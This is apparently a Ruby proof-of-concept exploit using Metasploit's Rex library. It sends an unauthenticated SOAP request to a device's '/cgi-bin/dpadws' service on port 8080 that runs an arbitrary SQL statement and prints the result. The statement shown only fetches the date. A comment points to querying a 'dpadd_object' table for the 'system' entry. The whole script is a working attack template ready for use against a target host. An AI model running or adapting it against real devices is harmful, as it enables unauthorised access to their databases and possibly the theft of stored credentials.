#!/usr/bin/env ruby
# gets current date with the tablename of WTF.

require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

# select * from dpadd_object where name = 'system';

soap = %Q|<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body><service-databasesocketoperation xmlns="urn:xmethods-dpadws">
<payload>NO-PAYLOAD</payload>
<hashcode>NO-HASCHODE</hashcode>
<optionals>NO-OPTIONAL</optionals>
<callsource>WEB-DOMUSPAD_SOAP</callsource>
<waittime>5</waittime>
<function>DML-SQL</function>
<type>SELECT</type>
<statement>select datetime('now') as 'WTF';</statement>
<statement-len>109</statement-len>
</service-databasesocketoperation></soapenv:Body></soapenv:Envelope>
|

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8080", 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
	{
		'uri'   => "/cgi-bin/dpadws",
		'version' => '1.0',
		'method' => 'POST',
                'data' => soap,
                'headers' => {
                           'SOAPAction' => 'dbSoapRequest',
                }

	})

sock.send_request(req)
data = sock.read_response()
puts data.body
